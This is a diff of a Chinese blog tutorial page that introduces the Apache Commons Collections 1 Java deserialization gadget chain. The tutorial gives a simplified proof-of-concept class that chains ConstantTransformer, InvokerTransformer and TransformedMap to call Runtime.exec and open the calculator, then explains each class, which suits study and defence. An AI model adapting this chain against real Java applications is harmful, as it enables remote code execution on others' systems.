@@ -7,7 +7,7 @@
     <meta name="keywords" content="java反序列化CommonCollections1(前言), Hexo">
     <meta name="description" content="java反序列化CommonCollections1(前言)
 java反序列化初学者直接看CommonCollections系列的链会很头疼，所以我们先把它简化(CommonCollections1)。
-123456789101112131">
+import org.apache.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -480,49 +480,115 @@ java反序列化初学者直接看CommonCollections系列的链会很头疼，�
             <div id="articleContent">
                 <p>java反序列化CommonCollections1(前言)</p>
 <p>java反序列化初学者直接看CommonCollections系列的链会很头疼，所以我们先把它简化(CommonCollections1)。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                        &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections1 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]
+                        &#123;&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),
+        &#125;;
+        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);
+
+        Map innerMap &#x3D; new HashMap();
+        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);
+        outerMap.put(&quot;key&quot;, &quot;value&quot;);
+    &#125;
+&#125;</code></pre>
 
 <p>运行上面的代码，本地的计算器就会被弹窗出来。</p>
 <img src="/Downloads/common11.png"  style="zoom:50%;" />
 
 <p>接下来，我们逐个分析代码中涉及到的的接口和类。</p>
 <h2 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h2><p>TransformerMap用于对Java标准数据结构Map做修饰，在被修饰的Map添加新的元素时，将触发一个回调。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Map outerMap &#x3D; TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</code></pre>
 
 <p>其中innerMap是被修饰的Map，outerMap是修饰过后的Map。keyTransformer是修饰新的key元素的回调，valueTransformer是修饰新的value元素的回调。但是这里的“回调”，并不是一个回调函数，而是一个实现了Transformer接口的类。而这个类会实现一个transformer方法。触发回调后，最终会调用这个transformer方法。</p>
 <h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，实现这个接口的类就是上面我们提到的“回调”。这个接口只有一个待实现的方法：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public interface Transformer&#123;
+    public Object transform(Object input);
+&#125;</code></pre>
 
 <p>如同上面所说的，TransformerMap在转换新元素时，会触发回调，最后执行这个方法。而这个“回调”本身是实现了这个接口的类。</p>
 <h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是一个实现了Transformer接口的类，它会在构造函数执行时传入一个对象，而它的transformer方法则会返回这个对象。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public ConstantTransformer(Object constantToReturn) &#123;
+        this.iConstant &#x3D; constantToReturn;
+    &#125;
+
+public Object transform(Object input) &#123;
+        return this.iConstant;
+    &#125;</code></pre>
 
 <p>其实就是包装一个对象，并在transform方法中返回，至于它在整个代码中的具体作用，我们会在下文中提到。</p>
 <h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer也是一个实现了Transformer接口的类。而这个类的transformer方法中可以执行任意的方法。这是反序列化能够执行任意代码的关键。</p>
 <p>它的构造方法需要传入三个参数，第一个参数是待执行的方法名，第二个参数是待执行方法参数列表的参数类型，第三个参数是传给这个方法的参数列表（其实光看参数的话会让我们联想到反射中的invoke方法，而实际后面也的确把这些参数传入了invoke方法，导致任意代码执行。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
+        this.iMethodName &#x3D; methodName;
+        this.iParamTypes &#x3D; paramTypes;
+        this.iArgs &#x3D; args;
+    &#125;</code></pre>
 
 <p>之后的transformer方法会传入一个Object类型的参数对象，最后通过反射的方式来执行这个对象的iMethodName方法。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public Object transform(Object input) &#123;
+        if (input &#x3D;&#x3D; null) &#123;
+            return null;
+        &#125; else &#123;
+            try &#123;
+                Class cls &#x3D; input.getClass();
+                Method method &#x3D; cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            &#125; catch (NoSuchMethodException var4) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
+            &#125; catch (IllegalAccessException var5) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
+            &#125; catch (InvocationTargetException var6) &#123;
+                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var6);
+            &#125;
+        &#125;
+    &#125;</code></pre>
 
 <p>至于这个input对象是怎么传入的，这个我们下文中会讲。</p>
 <h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>同样ChainedTransformer也是一个实现了Transformer接口的类。它的构造函数中会传入一个Transformer类型的数组，它的transformer方法作用是将构造函数中传入的数组中的多个Transformer串接在一起，也就是前一个回调的返回结果，会作为后一个回调的参数传入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">public ChainedTransformer(Transformer[] transformers) &#123;
+        this.iTransformers &#x3D; transformers;
+    &#125;
+
+public Object transform(Object object) &#123;
+        for(int i &#x3D; 0; i &lt; this.iTransformers.length; ++i) &#123;
+            object &#x3D; this.iTransformers[i].transform(object);
+        &#125;
+
+        return object;
+    &#125;</code></pre>
 
 
 
 <h2 id="回看原代码"><a href="#回看原代码" class="headerlink" title="回看原代码"></a>回看原代码</h2><p>这里我们摘出来核心代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                        &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Transformer[] transformers &#x3D; new Transformer[]&#123;
+                new ConstantTransformer(Runtime.getRuntime()),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]
+                        &#123;&quot;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),
+        &#125;;
+        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</code></pre>
 
 <p>首先new了一个Transformer类型的数组，并把它传入到了ChainedTransformer的构造函数中，从之前ChainedTransformer类中的代码中可以知道，这个数组被传给了成员变量iTransformers，并和我们之前说的那样在tramsformer方法中把这个数组中的元素串街起来。然后我们看传入的两个Transformer，第一个是ConstantTransformer对象，在实例化这个对象时会传入一个Runtime对象（这个类有可以执行任意方法的exec函数）。在ChainedTransformer对象的transformer方法中会调用ConstantTransformer对象的transformer方法，把传入的这个Runtime对象返回，并当作参数传入到iTransformers中下一个Transformer的transformer方法中，也就是InvokerTransformer对象中的transformer方法（这里就解释了之前的那额input对象的传入方法）。最后执行传入的exec函数，造成任意代码执行。</p>
 <p>​    </p>
 <p>上述所说的只是一系列回调。我们需要用TransformedMap.decorate来包装一个Map</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">Map innerMap &#x3D; new HashMap();
+Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);</code></pre>
 
 
 
 <p>然后通过增加一个新元素来触发transformerChain的transformers方法，进而触发上述一系列回调。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure>
+<pre class="language-java" data-language="java"><code class="language-java">outerMap.put(&quot;key&quot;, &quot;value&quot;);</code></pre>
 
 
                 
